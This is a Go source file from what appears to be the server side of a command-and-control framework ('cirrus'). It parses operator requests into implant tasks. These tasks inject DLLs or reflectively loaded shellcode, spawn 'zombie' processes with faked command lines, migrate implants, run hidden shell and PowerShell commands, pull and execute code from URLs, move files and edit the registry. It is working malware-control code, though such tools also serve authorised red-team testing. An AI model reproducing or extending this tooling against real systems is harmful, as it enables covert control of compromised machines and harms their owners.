package cirrus

import (
	"encoding/base64"
	"encoding/json"
	"strings"

	"github.com/PurpleSec/routex/val"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	errBadB64        = xerr.New(`value "data" was not proper base64`)
	errInvalidMethod = xerr.New("method value is invalid")
)

var valFilter = val.Validator{
	Name: "filter", Type: val.Object, Optional: true, Rules: val.Rules{
		val.SubSet{
			val.Validator{Name: "pid", Type: val.Int, Optional: true},
			val.Validator{Name: "session", Type: val.Bool, Optional: true},
			val.Validator{Name: "fallback", Type: val.Bool, Optional: true},
			val.Validator{Name: "elevated", Type: val.Bool, Optional: true},
			val.Validator{Name: "exclude", Type: val.ListString, Optional: true},
			val.Validator{Name: "include", Type: val.ListString, Optional: true},
		},
	},
}

var (
	valPullEx = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskDLL = val.Set{
		val.Validator{Name: "path", Type: val.String, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "reflect", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskPull = val.Set{
		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskSpawn = val.Set{
		val.Validator{Name: "payload", Type: val.Any, Optional: true},
		val.Validator{Name: "method", Type: val.String, Optional: true},
		val.Validator{Name: "profile", Type: val.String, Optional: true},
		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskZombie = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "fake", Type: val.String, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSystem = val.Set{
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSimple = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskUpload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "data", Type: val.String},
	}
	valTaskProfile = val.Set{
		val.Validator{Name: "profile", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskMigrate = val.Set{
		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
		val.Validator{Name: "payload", Type: val.Any, Optional: true},
		val.Validator{Name: "method", Type: val.String, Optional: true},
		val.Validator{Name: "profile", Type: val.String, Optional: true},
		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskAssembly = val.Set{
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSystemIo = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "name", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "path", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "dest", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "source", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "pid", Type: val.Int, Optional: true, Rules: val.Rules{val.GreaterThanZero}},
	}
	valTaskDownload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskRegistry = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "type", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "value", Type: val.String, Optional: true},
		val.Validator{Name: "key", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
)

const (
	boolNone  taskBool = 0
	boolTrue  taskBool = 2
	boolFalse taskBool = 1
)

type taskBool uint8
type taskDLL struct {
	taskPayload
	Path    string   `json:"path"`
	Reflect taskBool `json:"reflect"`
}
type taskPull struct {
	taskExecute
	URL string `json:"url"`
}
type taskSpawn struct {
	Filter  *filter.Filter  `json:"filter"`
	Name    string          `json:"name"`
	Method  string          `json:"method"`
	Profile string          `json:"profile"`
	Payload json.RawMessage `json:"payload"`
}
type taskZombie struct {
	taskPayload
	Fake string `json:"fake"`
}
type taskSystem struct {
	Filter  *filter.Filter `json:"filter"`
	Command string         `json:"cmd"`
	Args    string         `json:"args"`
}
type taskMigrate struct {
	taskSpawn
	Wait taskBool `json:"wait"`
}
type taskPayload struct {
	taskExecute
	Data string `json:"data"`
}
type taskCommand struct {
	taskExecute
	Command string `json:"cmd"`
}
type taskExecute struct {
	Filter *filter.Filter `json:"filter"`
	Show   taskBool       `json:"show"`
	Detach taskBool       `json:"detach"`
}

func (t *taskPayload) Payload() ([]byte, error) {
	b, err := base64.StdEncoding.DecodeString(t.Data)
	if len(b) == 0 || err != nil {
		return nil, errBadB64
	}
	return b, nil
}
func (b *taskBool) UnmarshalJSON(d []byte) error {
	if len(d) == 0 {
		*b = boolNone
		return nil
	}
	if d[0] == '"' && len(d) >= 1 {
		switch d[1] {
		case '1', 'T', 't':
			*b = boolTrue
			return nil
		case '0', 'F', 'f':
			*b = boolFalse
			return nil
		}
		*b = boolNone
		return nil
	}
	switch d[0] {
	case '1', 'T', 't':
		*b = boolTrue
		return nil
	case '0', 'F', 'f':
		*b = boolFalse
		return nil
	}
	*b = boolNone
	return nil
}
func (t *taskDLL) Tasklet() (task.Tasklet, error) {
	if len(t.Path) > 0 {
		return task.DLL{Path: t.Path, Filter: t.Filter, Wait: t.Detach != boolTrue}, nil
	}
	b, err := t.Payload()
	if err != nil {
		return nil, err
	}
	if t.Reflect == boolTrue {
		return task.Assembly{Data: cmd.DLLToASM("", b), Filter: t.Filter, Wait: t.Detach != boolTrue}, nil
	}
	return task.DLL{Data: b, Filter: t.Filter, Wait: t.Detach != boolTrue}, nil
}
func (t *taskSpawn) Callable() (task.Callable, error) {
	// NOTE(dij): The created instances are omitting the Filter value
	//            as this is set by the Spawn and Migrate functions when starting
	//            up.
	switch strings.ToLower(t.Method) {
	case "":
		return nil, nil
	case "dll":
		var v taskDLL
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 && len(v.Path) == 0 {
			return nil, xerr.New(`specify a non-empty "data" or "path" value`)
		}
		i, err := v.Tasklet()
		if err != nil {
			return nil, err
		}
		return i.(task.Callable), nil
	case "asm":
		var v taskPayload
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 {
			return nil, xerr.New(`invalid or empty "data" value`)
		}
		b, err := v.Payload()
		if err != nil {
			return nil, err
		}
		return task.Assembly{Data: cmd.DLLToASM("", b), Wait: v.Detach != boolTrue}, nil
	case "exec":
		var v taskCommand
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Command) == 0 {
			return nil, xerr.New(`invalid or empty "command" value`)
		}
		i := task.Process{Hide: v.Show != boolTrue, Wait: v.Detach != boolTrue}
		switch v.Command[0] {
		case '.':
			i.Args = []string{"@SHELL@", v.Command[1:]}
		case '$':
			i.Args = []string{"@PHELL@", "-nop", "-nol", "-c", v.Command[1:]}
		default:
			i.Args = cmd.Split(v.Command)
		}
		return i, nil
	case "zombie":
		var v taskZombie
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 {
			return nil, xerr.New(`invalid or empty "data" value`)
		}
		if len(v.Fake) == 0 {
			return nil, xerr.New(`invalid or empty "fake" value`)
		}
		b, err := v.Payload()
		if err != nil {
			return nil, err
		}
		return task.Zombie{Data: cmd.DLLToASM("", b), Args: cmd.Split(v.Fake), Filter: t.Filter, Hide: v.Show != boolTrue, Wait: v.Detach != boolTrue}, nil
	}
	return nil, errInvalidMethod
}
